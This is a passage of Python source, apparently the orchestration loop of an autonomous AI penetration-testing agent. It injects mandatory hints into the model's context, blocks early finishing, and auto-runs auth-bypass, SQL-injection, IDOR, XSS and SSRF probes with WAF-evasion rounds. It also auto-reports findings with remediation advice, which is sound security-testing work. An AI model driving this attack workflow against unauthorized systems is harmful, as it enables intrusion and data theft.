                        for hint_line in findings_hint:
                            # Parse finding_type + component from the hint line —
                            # hint lines look like "  - 500 3031B /path → ... finding_type=X)"
                            ft_match = _re.search(r"finding_type=([a-z_]+)", hint_line)
                            path_match = _re.search(r"\s(/[^\s]+)\s*→", hint_line)
                            if ft_match and path_match:
                                key = (ft_match.group(1), path_match.group(1))
                                _pending_findings[key] = hint_line
                        if findings_hint:
                            hint_msg = (
                                "SYSTEM HINT — MANDATORY ACTION REQUIRED\n\n"
                                "The previous probe output contains "
                                f"{len(findings_hint)} likely REAL findings (baseline "
                                f"SPA shell = {_baseline_size or 'unknown'}B, already filtered out).\n\n"
                                "Your NEXT actions MUST be report_finding calls for "
                                "EVERY item below — one report_finding per item, in a "
                                "single response. DO NOT run another probe until all "
                                "of these are reported. DO NOT skip any of them.\n\n"
                                + "\n".join(findings_hint[:12])
                                + "\n\nEmit them all now as a single JSON object with "
                                "multiple actions in the 'actions' array. After "
                                "reporting, proceed to sqlmap or deeper verification."
                            )
                            self.state.add_message("user", hint_msg)
                            logger.info(
                                "iter %d: injected finding hint with %d candidates",
                                self.state.iteration, len(findings_hint),
                            )

                # Sticky hint re-injection: after any tool call, check which
                # pending findings are still NOT in the finding_tools store.
                # If there are still >= 2 unreported items, re-emit a condensed
                # nudge. This catches the case where Brain reports 2 items and
                # wanders off without finishing the list.
                if _pending_findings and name != "report_finding" and _sticky_last_iter < self.state.iteration:
                    try:
                        from vxis.agent.tools.finding_tools import _get_findings as _fget
                        reported_components = {
                            (f["finding_type"].lower(), f["affected_component"])
                            for f in _fget()
                        }
                    except Exception:
                        reported_components = set()
                    # Cull: drop reported AND refuted entries from pending so
                    # we don't keep nudging Brain toward items the verifier
                    # already killed.
                    # Normalize refuted component keys: strip scheme+host so
                    # "/api" matches "http://localhost:3000/api"
                    refuted_keys: set[tuple[str, str]] = set()
                    for rf in self.state.refuted_findings:
                        _rc = str(rf.get("affected_component", ""))
                        refuted_keys.add((str(rf.get("finding_type", "")).lower(), _rc))
                        # Also add path-only version
                        try:
                            from urllib.parse import urlparse as _uparse
                            _rp = _uparse(_rc).path
                            if _rp:
                                refuted_keys.add((str(rf.get("finding_type", "")).lower(), _rp))
                        except Exception:
                            pass
                    for k in list(_pending_findings.keys()):
                        if k in reported_components or k in refuted_keys:
                            _pending_findings.pop(k, None)
                    still_pending = dict(_pending_findings)
                    # Only nudge if there are unreported items AND we've done
                    # at least 2 non-report actions since the last hint (avoid
                    # spam after first emission). Also throttle: once per iter.
                    if len(still_pending) >= 2 and name in ("python_exec", "shell_exec", "http_request"):
                        _sticky_last_iter = self.state.iteration
                        nudge_lines = list(still_pending.values())[:6]
                        nudge_msg = (
                            "STICKY HINT REMINDER — you still have "
                            f"{len(still_pending)} unreported findings from the earlier "
                            "probe. Emit report_finding for each of these BEFORE any "
                            "more probing:\n"
                            + "\n".join(nudge_lines)
                        )
                        self.state.add_message("user", nudge_msg)
                        logger.info(
                            "iter %d: sticky re-injection, %d pending",
                            self.state.iteration, len(still_pending),
                        )

                if name == "finish_scan":
                    # Reject premature finish: enforce minimum exploration
                    _min_iters = min(50, self.state.max_iters // 2)
                    if self.state.iteration < _min_iters:
                        self._reject_finish_scan(
                            title="premature_finish",
                            reason=(
                                f"finish_scan was attempted at iter {self.state.iteration} before the minimum "
                                f"exploration floor {_min_iters}."
                            ),
                            action_hint="Keep scanning and exercise at least one concrete high-signal vector before trying to finish again.",
                            summary=(
                                f"finish_scan REJECTED — only {self.state.iteration} "
                                f"iterations done, minimum {_min_iters} required. "
                                "Keep exploring: try injection_vectors playbook, "
                                "test SQLi on discovered endpoints, run nuclei, "
                                "or probe authentication endpoints."
                            ),
                            data={"premature": True},
                        )
                        logger.warning(
                            "iter %d: finish_scan rejected (min=%d)",
                            self.state.iteration, _min_iters,
                        )
                        continue

                    # Reject finish if findings exist but insufficient chains
                    # relative to finding count. Also surface concrete finding
                    # IDs + a ready-to-call link_chain template so Brain has
                    # no excuse to spin aimlessly.
                    try:
                        from vxis.agent.tools.finding_tools import _get_findings as _gf2, _get_chains as _gc2
                        _fin_findings = _gf2()
                        _fin_chains = _gc2()
                        _fin_chainable = self._chainable_findings(_fin_findings)
                        _fin_desired = self._desired_chain_count(_fin_findings)
                        # Phase Q11: hard-block finish_scan when nothing has
                        # been reported. Pre-Q11 the chains-deficit branch
                        # below was gated on `findings >= 3`, so 0-finding
                        # finish_scan past min_iters slipped to acceptance.
                        # Q10 smoke caught this on Calculator.app: Brain
                        # called finish_scan at iter 25/50 with no findings
                        # yet → silent completion, VC=0, empty report. Force
                        # Brain to keep exploring or report what it found.
                        if not _fin_findings:
                            _registered = []
                            try:
                                _registered = sorted(self.registry.list_tools())
                            except Exception:
                                pass
                            self._reject_finish_scan(
                                title="empty_scan",
                                reason=(
                                    f"finish_scan was attempted at iter {self.state.iteration} with zero accepted findings."
                                ),
                                action_hint="Run a concrete probe or report the evidence you already have before finishing.",
                                summary=(
                                    f"finish_scan REJECTED — 0 findings after "
                                    f"{self.state.iteration} iterations. "
                                    "An empty report is not a scan. Pick a "
                                    "concrete probe NOW:\n"
                                    "  - run_skill(skill=\"<one of the registered skills>\")\n"
                                    "  - shell_exec — sqlmap/nuclei/ffuf for web, "
                                    "otool/codesign/lipo for macOS desktop\n"
                                    "  - report_finding — if you DO have evidence, report it before finishing\n"
                                    f"Tools available: {', '.join(_registered[:12])}"
                                ),
                                data={
                                    "empty_scan": True,
                                    "iter": self.state.iteration,
                                },
                            )
                            logger.warning(
                                "iter %d: finish_scan rejected (0 findings)",
                                self.state.iteration,
                            )
                            continue
                        if _fin_desired > 0 and len(_fin_chains) < _fin_desired:
                            # Build concrete chain suggestions from actual IDs.
                            # Group by severity — high/critical first so Brain
                            # is pointed at the most impactful composition.
                            _sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "informational": 4}
                            _sorted = sorted(
                                _fin_findings,
                                key=lambda f: _sev_order.get(f.get("severity", "low"), 5),
                            )
                            # Take the top 4 and propose pairwise chains.
                            _top = [f["id"] for f in _sorted[:4]]
                            _existing_ids_in_chains = {
                                tuple(sorted(c.get("finding_ids", [])))
                                for c in _fin_chains
                            }
                            _suggestions: list[str] = []
                            for i in range(len(_top)):
                                for j in range(i + 1, len(_top)):
                                    pair = tuple(sorted([_top[i], _top[j]]))
                                    if pair in _existing_ids_in_chains:
                                        continue
                                    _suggestions.append(
                                        f'link_chain(finding_ids=["{_top[i]}","{_top[j]}"], '
                                        f'rationale="<why {_top[i]} enables {_top[j]}>", '
                                        f'crown_jewel="<admin takeover | DB dump | RCE | data exfil>")'
                                    )
                                    if len(_suggestions) >= 4:
                                        break
                                if len(_suggestions) >= 4:
                                    break
                            _sug_block = "\n  ".join(_suggestions) or "(build any chain you can imagine)"
                            _findings_block = "\n  ".join(
                                f"{f['id']} [{f.get('severity','?').upper()}] {f.get('finding_type','')}: {f.get('title','')[:60]}"
                                for f in _sorted[:10]
                            )
                            self._reject_finish_scan(
                                title="needs_chains",
                                reason=(
                                    f"finish_scan was attempted with {len(_fin_findings)} findings but only "
                                    f"{len(_fin_chains)} chains; target is at least {_fin_desired}."
                                ),
                                action_hint="Link and validate at least one more attack chain before finishing.",
                                summary=(
                                    f"finish_scan REJECTED — {len(_fin_findings)} findings, "
                                    f"{len(_fin_chains)} chains (need ≥{_fin_desired}).\n"
                                    f"DO NOT call finish_scan yet.\n"
                                    f"CHAINABLE FINDINGS: {len(_fin_chainable)}\n\n"
                                    f"YOUR FINDINGS:\n  {_findings_block}\n\n"
                                    f"READY-TO-CALL link_chain SUGGESTIONS:\n  {_sug_block}\n\n"
                                    "Pick one, customise the rationale/crown_jewel, call link_chain, "
                                    "then try the next. Each chain you link = one step closer to "
                                    "passing the gate. Crown jewels: admin takeover, DB dump, RCE, "
                                    "key theft, full data exfil."
                                ),
                                data={
                                    "needs_chains": True,
                                    "chain_deficit": _fin_desired - len(_fin_chains),
                                    "suggestions": _suggestions,
                                },
                            )
                            logger.warning(
                                "iter %d: finish_scan rejected (%d chains / %d target, %d findings)",
                                self.state.iteration, len(_fin_chains),
                                _fin_desired, len(_fin_findings),
                            )
                            continue
                        _blocking_branches = self._blocking_finish_branches()
                        if _blocking_branches and self.state.iteration < self._finish_branch_guard_until(self.state.max_iters):
                            _branch_block = "\n  ".join(
                                f"{b.id} p{b.priority} attempts={b.attempts} title={b.title} "
                                f"objective={b.objective[:70]} next={b.next_step[:70]}"
                                for b in _blocking_branches[:6]
                            )
                            self._reject_finish_scan(
                                title="unfinished_branches",
                                reason=(
                                    f"finish_scan was attempted while {len(_blocking_branches)} high-priority branches remained active."
                                ),
                                action_hint="Stay on the strongest live branch until it is proven, exhausted, or blocked.",
                                summary=(
                                    "finish_scan REJECTED — high-priority attack branches remain active.\n\n"
                                    f"UNFINISHED BRANCHES:\n  {_branch_block}\n\n"
                                    "Strix-style rule: reporting a finding is not the end. Stay on each live branch "
                                    "until you either expand it into real impact/crown-jewel access, or clearly exhaust/block it."
                                ),
                                data={
                                    "unfinished_branches": [b.to_dict() for b in _blocking_branches[:6]],
                                },
                            )
                            logger.warning(
                                "iter %d: finish_scan rejected (%d blocking branches)",
                                self.state.iteration,
                                len(_blocking_branches),
                            )
                            continue
                        if self.state.max_iters >= 30:
                            _open_candidates = self._remaining_high_yield_family_candidates(_fin_findings)
                            if _open_candidates:
                                _cand_block = "\n  ".join(
                                    f"{c.id} ({c.vector_id}) p{c.priority}: {c.title}"
                                    for c in _open_candidates[:8]
                                )
                                self._reject_finish_scan(
                                    title="unattempted_candidates",
                                    reason=(
                                        f"finish_scan was attempted while {len(_open_candidates)} high-priority vector candidates had never been tried."
                                    ),
                                    action_hint="Attempt each high-priority candidate at least once before finishing.",
                                    summary=(
                                        "finish_scan REJECTED — high-priority vector candidates "
                                        "remain unattempted. Exhaust them first:\n"
                                        f"  {_cand_block}\n\n"
                                        "For each candidate: try a concrete tool/payload, then drive it to "
                                        "found, clean, blocked, or dead before finishing."
                                    ),
                                    data={
                                        "unresolved_vector_candidates": [
                                            c.to_dict() for c in _open_candidates[:8]
                                        ],
                                    },
                                )
                                logger.warning(
                                    "iter %d: finish_scan rejected (%d unattempted high-priority candidates)",
                                    self.state.iteration,
                                    len(_open_candidates),
                                )
                                continue
                    except Exception:
                        logger.exception("finish_scan rejection check failed")
                    if result.ok:
                        self.state.completed = True
                        break
            # Track which tools Brain actually called this iteration
            for name, _ in actions:
                _tools_used.add(name)

            # Sample messages[] byte size at the end of each iteration.
            # Phase B fix: populates peak_context_bytes metric that was 0 in Task 11.
            self.state.update_peak_size()

            # ── Phase E: skill auto-execution ────────────────────────────
            # Skills run on schedule. Brain sees the results and decides
            # what to report. This is the "skills for known attacks,
            # Brain for creative thinking" pattern.
            if "run_skill" in self.registry.list_tools():
                for skill_name, trigger_iter, extra_params in _skill_sequence:
                    if (
                        skill_name not in _skills_completed
                        and self.state.iteration >= trigger_iter
                    ):
                        # Phase Q: surface gate. _skill_sequence is a hardcoded
                        # web recon ladder (enumerate_endpoints → test_infra →
                        # attempt_auth → ...). On desktop targets these all hit
                        # file:// and produce noise / false positives. Skip the
                        # web ladder entirely; the kind-aware sweep at L~2150
                        # surfaces the real desktop skills instead.
                        _real_skill_check = extra_params.get("_skill_override") or skill_name
                        if (
                            self._target_kind == _TK.DESKTOP
                            and _real_skill_check not in _DESKTOP_SKILLS
                        ):
                            _skills_completed.add(skill_name)
                            continue
                        _skills_completed.add(skill_name)
                        try:
                            params = {**extra_params}
                            # Allow a queue entry to alias an existing skill
                            # (e.g. test_idor_1 → test_idor with different
                            # url_pattern). This lets us run the same skill
                            # multiple times with distinct parameters without
                            # confusing the de-dup set.
                            _real_skill = params.pop("_skill_override", None) or skill_name
                            _real_skill, params = self._reroute_blocked_skill(_real_skill, params)
                            if not _real_skill:
                                logger.info(
                                    "iter %d: auto skill queue=%s skipped after blocked-skill reroute",
                                    self.state.iteration,
                                    skill_name,
                                )
                                continue
                            # Track the real skill even when called via alias,
                            # so the sweep block can detect untouched skills.
                            _real_skills_completed.add(_real_skill)
                            self._emit_action_progress(
                                "run_skill",
                                {"skill": _real_skill, "target_url": self.state.target},
                                "Auto skill dispatch",
                            )
                            sr = await self.registry.dispatch("run_skill", {
                                "skill": _real_skill,
                                "target_url": self.state.target,
                                "params": params,
                            })
                            if sr.ok:
                                self.state.add_message("tool", {
                                    "name": "run_skill",
                                    "args": {"skill": _real_skill, "queue_id": skill_name},
                                    "result": {"ok": True, "summary": sr.summary, "data": sr.data},
                                })
                                logger.info(
                                    "skill %s completed (queue=%s): %s",
                                    _real_skill, skill_name, sr.summary[:100],
                                )

                                # Chain: if auth succeeded, queue post-auth skills
                                if _real_skill == "attempt_auth" and sr.data:
                                    if sr.data.get("authenticated"):
                                        _auth_token = sr.data.get("token", "")
                                        method = sr.data.get("method", "?")
                                        creds = sr.data.get("credentials_used", {})
                                        # Auto-report auth finding
                                        severity = "critical" if "sqli" in method else "high"
                                        ftype = "sql_injection" if "sqli" in method else "weak_auth"
                                        login_endpoint = sr.data.get("login_endpoint", self.state.target)
                                        control_checks = sr.data.get("control_checks", {}) or {}
                                        poc_blob = (
                                            sr.data.get("poc_http_exchange")
                                            or (
                                                f"Method: {method}\n"
                                                f"Credentials used: {creds}\n"
                                                f"Token: {_auth_token[:120]}\n"
                                                f"User info: {sr.data.get('user_info', {})}\n"
                                                f"Control checks: {control_checks}"
                                            )
                                        )
                                        await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                            title=f"Authentication bypass via {method}",
                                            severity=severity,
                                            finding_type=ftype,
                                            affected_component=login_endpoint,
                                            description=f"Authentication succeeded via {method}.",
                                            impact="An unauthenticated actor can obtain a valid session or token and pivot into post-authenticated functionality.",
                                            technical_analysis=(
                                                f"The attempt_auth skill reported authenticated=True using method={method}. "
                                                f"Negative control: {control_checks.get('negative_control', {})}. "
                                                f"Positive control: {control_checks.get('positive_control', {})}. "
                                                "This indicates the login boundary can be bypassed under the observed conditions."
                                            ),
                                            poc_description="Replay the authentication flow with the same bypass technique and confirm that the application returns an authenticated token or session.",
                                            poc_script_code=poc_blob,
                                            remediation_steps="Enforce server-side authentication checks, normalize credential validation, and add regression tests for the bypass condition.",
                                            endpoint=login_endpoint,
                                            method="POST",
                                        ))
                                        # Queue post-auth skills
                                        _post_auth_skills = [
                                            ("post_auth_enum", self.state.iteration + 2, {"token": _auth_token}),
                                            ("test_idor", self.state.iteration + 4, {"token": _auth_token}),
                                            ("test_auth_deep", self.state.iteration + 5, {"token": _auth_token}),
                                        ]
                                        for _queued_skill, _queued_iter, _queued_params in _post_auth_skills:
                                            _queue_skill(_queued_skill, _queued_iter, _queued_params)
                                        self.state.add_message("user", (
                                            f"SKILL CHAIN: Auth bypass confirmed via {method}! "
                                            f"Token acquired. Post-auth skills queued."
                                        ))

                                # Auto-report sensitive files
                                if _real_skill == "test_sensitive_files" and sr.data:
                                    for exposed in (sr.data.get("exposed") or [])[:10]:
                                        sev = exposed.get("severity", "medium")
                                        if sev in ("critical", "high"):
                                            exposed_path = self.state.target + exposed["path"]
                                            preview = exposed.get("preview", "")[:1000]
                                            poc_blob = self._build_simple_http_poc(
                                                url=exposed_path,
                                                status=exposed.get("status", "?"),
                                                response_preview=preview,
                                            )
                                            self.state.record_retrieval_observation(
                                                finding_type="information_disclosure",
                                                component=exposed_path,
                                                retrieval_kind="sensitive_file",
                                                summary=f"Sensitive file content retrieved from {exposed['path']}",
                                                sample=preview,
                                            )
                                            await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                                title=f"Sensitive file exposed: {exposed['path']}",
                                                severity=sev,
                                                finding_type="information_disclosure",
                                                affected_component=exposed_path,
                                                description=exposed.get("description", "") or f"Sensitive file {exposed['path']} is externally accessible.",
                                                impact="Sensitive configuration or credential material may be retrievable without authorization, enabling follow-on compromise.",
                                                technical_analysis=(
                                                    f"The sensitive files skill marked {exposed['path']} as exposed and returned response content preview, "
                                                    "which indicates direct unauthenticated access to non-public file content."
                                                ),
                                                poc_description="Request the exposed file path directly and verify that the server returns the file contents without an authorization challenge.",
                                                poc_script_code=poc_blob,
                                                remediation_steps="Deny public access to sensitive files, remove secrets from web roots, and return 403/404 for internal artifacts.",
                                                endpoint=exposed_path,
                                                method="GET",
                                                extra_evidence=[
                                                    self._retrieval_evidence_item(
                                                        title="Retrieved Sensitive File Preview",
                                                        retrieval_kind="sensitive_file",
                                                        summary=f"Unauthenticated retrieval of {exposed['path']}",
                                                        sample=preview,
                                                    )
                                                ],
                                            ))

                                # Auto-report injection findings
                                if _real_skill == "test_injection" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        inj_sev = finding.get("severity", "medium")
                                        if inj_sev not in ("high", "critical"):
                                            continue
                                        inj_url = sr.data.get("url", self.state.target)
                                        inj_param = sr.data.get("param", finding.get("param", "?"))
                                        control = finding.get("control", {}) or {}
                                        payload_text = finding.get("payload", "")
                                        poc_blob = self._build_reflected_get_poc(
                                            url=inj_url,
                                            param=inj_param,
                                            payload=payload_text,
                                            control=control,
                                            response_preview=finding.get("response_preview", "")[:1200],
                                        )
                                        args = {
                                            "title": f"{finding['type'].upper()} on {inj_param}",
                                            "severity": inj_sev,
                                            "finding_type": finding["type"],
                                            "affected_component": inj_url,
                                            "description": f"Payload: {payload_text[:80]}",
                                            "evidence": finding.get("response_preview", finding.get("evidence", ""))[:500],
                                        }
                                        args.update(self._build_report_finding_args(
                                            title=args["title"],
                                            severity=inj_sev,
                                            finding_type=finding["type"],
                                            affected_component=inj_url,
                                            description=f"Injection behavior was observed on parameter {inj_param}.",
                                            impact="Successful injection may expose backend data, execute attacker-controlled logic, or cross trust boundaries depending on the sink.",
                                            technical_analysis=(
                                                f"The injection skill recorded baseline/control data {control} alongside the payload response, "
                                                "which indicates the parameter reacts differently under attacker-controlled input."
                                            ),
                                            poc_description="Replay the payload against the same parameter and compare the baseline response to the injected response or delay/output delta.",
                                            poc_script_code=poc_blob,
                                            remediation_steps="Apply sink-specific input handling such as parameterized queries, output encoding, and strict server-side validation.",
                                            endpoint=inj_url,
                                            method="GET",
                                        ))
                                        await self._dispatch_report_finding_checked(args)

                                # Auto-report enumeration results
                                if _real_skill == "enumerate_endpoints" and sr.data:
                                    # Queue injection/XSS/SSRF on search/query endpoints
                                    accessible = sr.data.get("accessible", [])
                                    for ep in accessible:
                                        path = ep.get("path", "")
                                        if "?" in path or "search" in path.lower():
                                            full_url = self.state.target.rstrip("/") + path
                                            _queue_skill("test_injection", self.state.iteration + 2, {"url": full_url})
                                            _queue_skill("test_xss", self.state.iteration + 3, {"url": full_url})
                                            _queue_skill("test_ssrf", self.state.iteration + 4, {"url": full_url})
                                            break
                                    # Queue test_idor on discovered numeric-id
                                    # patterns so we don't rely on the
                                    # Juice-Shop-only /api/Users/{id} default.
                                    import re as _re2
                                    _idor_patterns_seen: set[str] = set()
                                    for ep in accessible:
                                        path = ep.get("path", "")
                                        # Match /segment/<digits> or /segment/<digits>/...
                                        m = _re2.search(r"^(/[^?]*?/)\d+(/|$)", path)
                                        if m:
                                            base = m.group(1).rstrip("/")
                                            pattern = self.state.target.rstrip("/") + base + "/{id}"
                                            if pattern not in _idor_patterns_seen:
                                                _idor_patterns_seen.add(pattern)
                                                _queue_skill(
                                                    "test_idor",
                                                    self.state.iteration + 5,
                                                    {"url_pattern": pattern, "_skill_override": "test_idor"},
                                                    alias=f"test_idor_{len(_idor_patterns_seen)}",
                                                )
                                                if len(_idor_patterns_seen) >= 4:
                                                    break
                                    # Also target common API shapes if nothing
                                    # numeric turned up yet. These are generic
                                    # probes, not target-specific.
                                    if not _idor_patterns_seen:
                                        for _candidate in (
                                            "/api/users/{id}", "/api/user/{id}",
                                            "/api/orders/{id}", "/api/account/{id}",
                                            "/users/{id}", "/profile/{id}",
                                        ):
                                            pattern = self.state.target.rstrip("/") + _candidate
                                            _queue_skill(
                                                "test_idor",
                                                self.state.iteration + 5,
                                                {"url_pattern": pattern, "_skill_override": "test_idor"},
                                                alias=f"test_idor_probe_{_candidate.strip('/').replace('/','_')}",
                                            )
                                    # Report error endpoints
                                    for ep in (sr.data.get("errors") or [])[:5]:
                                        preview = (ep.get("error_preview", "") or "")[:300]
                                        if not self._error_oracle_preview_is_actionable(preview):
                                            continue
                                        await self._dispatch_report_finding_checked({
                                            "title": f"HTTP 500 on {ep['path']}",
                                            "severity": "medium",
                                            "finding_type": "error_oracle",
                                            "affected_component": self.state.target + ep["path"],
                                            "description": f"Endpoint returns HTTP 500 ({ep.get('size', '?')}B) with actionable backend error details.",
                                            "evidence": preview,
                                        })

                                # IDOR results
                                if _real_skill == "test_idor" and sr.data:
                                    if sr.data.get("vulnerable"):
                                        ids = sr.data.get("accessible_ids", [])
                                        pattern = sr.data.get("url_pattern", "")
                                        control_evidence = sr.data.get("control_evidence", {}) or {}
                                        comparisons = sr.data.get("comparisons", []) or []
                                        exfil_sample = str(sr.data.get("data_samples", [])[:2])[:1200]
                                        self.state.record_retrieval_observation(
                                            finding_type="idor",
                                            component=pattern,
                                            retrieval_kind="unauthorized_object_access",
                                            summary=f"Accessible IDs: {ids[:10]} / auth bypass IDs: {sr.data.get('auth_bypass_ids', [])[:10]}",
                                            sample=exfil_sample,
                                        )
                                        poc_blob = (
                                            f"Accessible IDs: {ids[:10]}\n"
                                            f"Auth bypass IDs: {sr.data.get('auth_bypass_ids', [])[:10]}\n"
                                            f"Control evidence: {control_evidence}\n"
                                            f"Comparisons: {comparisons[:4]}\n"
                                            f"Samples: {sr.data.get('data_samples', [])[:2]}"
                                        )
                                        await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                            title=f"IDOR on {pattern}",
                                            severity="high",
                                            finding_type="idor",
                                            affected_component=pattern,
                                            description=f"{len(ids)} object identifier(s) were accessible outside the expected authorization boundary.",
                                            impact="Attackers may enumerate and retrieve other users' records or privileged objects without proper authorization.",
                                            technical_analysis=(
                                                f"The test_idor skill marked the pattern {pattern} as vulnerable and returned per-object comparisons. "
                                                f"Positive/negative controls: {control_evidence}. This demonstrates a broken object-level authorization check."
                                            ),
                                            poc_description="Repeat the same object access request across multiple IDs and verify that unrelated records are returned successfully.",
                                            poc_script_code=poc_blob,
                                            remediation_steps="Enforce server-side ownership and authorization checks on every object reference before returning data.",
                                            endpoint=pattern,
                                            method="GET",
                                            cwe="CWE-639",
                                            extra_evidence=[
                                                self._retrieval_evidence_item(
                                                    title="Unauthorized Object Retrieval",
                                                    retrieval_kind="unauthorized_object_access",
                                                    summary=f"Multiple object identifiers returned data across the same pattern {pattern}.",
                                                    sample=exfil_sample,
                                                ),
                                                self._exfil_evidence_item(
                                                    title="Potential Bulk Data Exfiltration Path",
                                                    summary="The vulnerable object pattern can be iterated across IDs to extract unrelated records.",
                                                    sample=str(comparisons[:4])[:1200],
                                                ),
                                            ],
                                        ))

                                # Post-auth enum results
                                if _real_skill == "post_auth_enum" and sr.data:
                                    user_data = sr.data.get("user_data_exposed", [])
                                    if user_data:
                                        paths = [e["path"] for e in user_data[:5]]
                                        control_evidence = sr.data.get("control_evidence", {}) or {}
                                        user_data_sample = str(user_data[:3])[:1200]
                                        self.state.record_retrieval_observation(
                                            finding_type="broken_access_control",
                                            component=self.state.target,
                                            retrieval_kind="post_auth_data_access",
                                            summary=f"Sensitive user data observed on {len(user_data)} authenticated endpoint(s): {paths}",
                                            sample=user_data_sample,
                                        )
                                        await self._dispatch_report_finding_checked(self._build_report_finding_args(
                                            title=f"Sensitive user data exposed on {len(user_data)} endpoint(s)",
                                            severity="high",
                                            finding_type="broken_access_control",
                                            affected_component=self.state.target,
                                            description=f"Authenticated functionality exposed sensitive user data on endpoints including: {paths}",
                                            impact="Low-privilege or bypassed access can disclose user records and enable lateral movement into other accounts.",
                                            technical_analysis=(
                                                "The post_auth_enum skill collected user-data-bearing endpoints after authentication and compared them with unauthenticated access results. "
                                                f"Control evidence: {control_evidence}."
                                            ),
                                            poc_description="Access the listed post-auth endpoints with the acquired session and confirm that user data is returned beyond the minimum necessary scope.",
                                            poc_script_code=(
                                                f"Control evidence: {control_evidence}\n"
                                                f"User data samples: {user_data_sample}"
                                            ),
                                            remediation_steps="Apply object- and field-level authorization checks on user data endpoints and minimize exposed record fields.",
                                            endpoint=self.state.target,
                                            method="GET",
                                            extra_evidence=[
                                                self._retrieval_evidence_item(
                                                    title="Authenticated Data Retrieval",
                                                    retrieval_kind="post_auth_data_access",
                                                    summary=f"Authenticated access exposed user data on {len(user_data)} endpoint(s).",
                                                    sample=user_data_sample,
                                                ),
                                                self._exfil_evidence_item(
                                                    title="Post-Authentication Exfiltration Surface",
                                                    summary=f"The acquired session unlocks reusable data-bearing endpoints: {paths}",
                                                    sample=str(control_evidence)[:1200],
                                                ),
                                            ],
                                        ))

                                # Auto-report: XSS findings
                                if _real_skill == "test_xss" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        xss_sev = finding.get("severity", "high")
                                        xss_url = sr.data.get("url", self.state.target)
                                        xss_param = finding.get("param", sr.data.get("param", "?"))
                                        payload = finding.get("payload", "")[:200]
                                        response_preview = finding.get("response_preview", finding.get("evidence", ""))[:1200]
                                        control = finding.get("control", {}) or {}
                                        xss_poc = self._build_reflected_get_poc(
                                            url=xss_url,
                                            param=xss_param,
                                            payload=payload,
                                            control=control,
                                            response_preview=response_preview,
                                        )
                                        args = {
                                            "title": f"XSS ({finding.get('type', 'reflected')}) on {xss_param}",
                                            "severity": xss_sev,
                                            "finding_type": f"xss_{finding.get('type', 'reflected')}",
                                            "affected_component": xss_url,
                                            "description": f"Cross-site scripting payload reflected or executed via parameter {xss_param}.",
                                            "evidence": response_preview,
                                        }
                                        if xss_sev in ("high", "critical"):
                                            args.update(self._build_report_finding_args(
                                                title=args["title"],
                                                severity=xss_sev,
                                                finding_type=args["finding_type"],
                                                affected_component=xss_url,
                                                description=args["description"],
                                                impact="An attacker may execute script in a victim browser, enabling session theft or authenticated action execution.",
                                                technical_analysis=(
                                                    "The XSS skill returned a concrete payload and response evidence indicating that attacker-controlled script content was reflected or executed. "
                                                    f"Baseline/control data: {control}."
                                                ),
                                                poc_description="Submit the supplied payload to the vulnerable parameter and confirm that it is reflected/executed in the response context.",
                                                poc_script_code=xss_poc,
                                                remediation_steps="Contextually encode untrusted input, apply output escaping, and deploy CSP as a secondary control.",
                                                endpoint=xss_url,
                                                method="GET",
                                                cwe="CWE-79",
                                            ))
                                        await self._dispatch_report_finding_checked(args)

                                # Payload rotation: if injection/xss/ssrf came up
                                # CLEAN at round R<3, re-queue at round R+1
                                # against the same URL. Round 2 = blind/time
                                # + filter bypass; round 3 = WAF-evasion
                                # polyglots. This prevents "one cheap classic
                                # pass, declare clean" when a WAF is in play.
                                if _real_skill in ("test_injection", "test_xss", "test_ssrf") and sr.data:
                                    _cur_round = sr.data.get("round", 1)
                                    if not sr.data.get("vulnerable") and _cur_round < 3:
                                        _url = sr.data.get("url")
                                        if _url:
                                            self._mark_family_probe_retryable(
                                                _real_skill,
                                                url=_url,
                                                round_num=_cur_round,
                                                tested_params=list(sr.data.get("tested_params") or []),
                                            )
                                            _next = _cur_round + 1
                                            _alias_r = (
                                                f"{_real_skill}__round{_next}_iter{self.state.iteration}"
                                            )
                                            _queue_skill(
                                                _real_skill,
                                                self.state.iteration + 2,
                                                {
                                                    "_skill_override": _real_skill,
                                                    "url": _url,
                                                    "round": _next,
                                                },
                                                alias=_alias_r,
                                            )
                                            logger.info(
                                                "payload rotation: re-queue %s round=%d on %s",
                                                _real_skill, _next, _url,
                                            )

                                # Auto-report: SSRF findings
                                if _real_skill == "test_ssrf" and sr.data:
                                    for finding in (sr.data.get("findings") or []):
                                        ssrf_sev = finding.get("severity", "high")
                                        ssrf_url = sr.data.get("url", self.state.target)
                                        ssrf_param = finding.get("param", sr.data.get("param", "?"))
                                        payload = finding.get("payload", "")[:200]
                                        response_preview = finding.get("response_preview", finding.get("evidence", ""))[:1200]
                                        control = finding.get("control", {}) or {}
                                        matched_signal = str(control.get("matched_signal") or finding.get("type", "internal_response"))
                                        callback_summary = response_preview[:500] or str(finding.get("evidence", ""))[:500]
                                        self.state.record_callback_observation(
                                            finding_type="ssrf",
                                            component=ssrf_url,
                                            signal=matched_signal,
                                            payload=payload,
                                            summary=callback_summary,
                                        )
                                        ssrf_poc = self._build_reflected_get_poc(
                                            url=ssrf_url,
                                            param=ssrf_param,
                                            payload=payload,
                                            control=control,
                                            response_preview=response_preview,
                                        )
                                        args = {
                                            "title": f"SSRF via {finding.get('type', 'ssrf')} on {ssrf_param}",
                                            "severity": ssrf_sev,
                                            "finding_type": "ssrf",
                                            "affected_component": ssrf_url,
                                            "description": f"Server-side request behavior was influenced via parameter {ssrf_param}.",
                                            "evidence": response_preview,
                                        }
                                        if ssrf_sev in ("high", "critical"):
                                            args.update(self._build_report_finding_args(
                                                title=args["title"],
                                                severity=ssrf_sev,
                                                finding_type="ssrf",
                                                affected_component=ssrf_url,
                                                description=args["description"],
                                                impact="Attackers may force the server to reach internal services, cloud metadata endpoints, or trust-bound internal resources.",
                                                technical_analysis=(
                                                    "The SSRF skill produced a payload and corresponding response preview suggesting server-side fetching or internal reachability. "
                                                    f"Baseline/control data: {control}."
                                                ),
                                                poc_description="Submit the SSRF payload to the target parameter and confirm that the server fetches or leaks data from the supplied internal URL.",
                                                poc_script_code=ssrf_poc,
                                                remediation_steps="Restrict outbound requests, enforce URL allowlists, and block internal address spaces from user-controlled fetches.",
                                                endpoint=ssrf_url,
                                                method="GET",
                                                cwe="CWE-918",
                                                extra_evidence=[
                                                    self._callback_evidence_item(
                                                        title="Callback / Internal Reachability",
                                                        signal=matched_signal,
                                                        payload=payload,
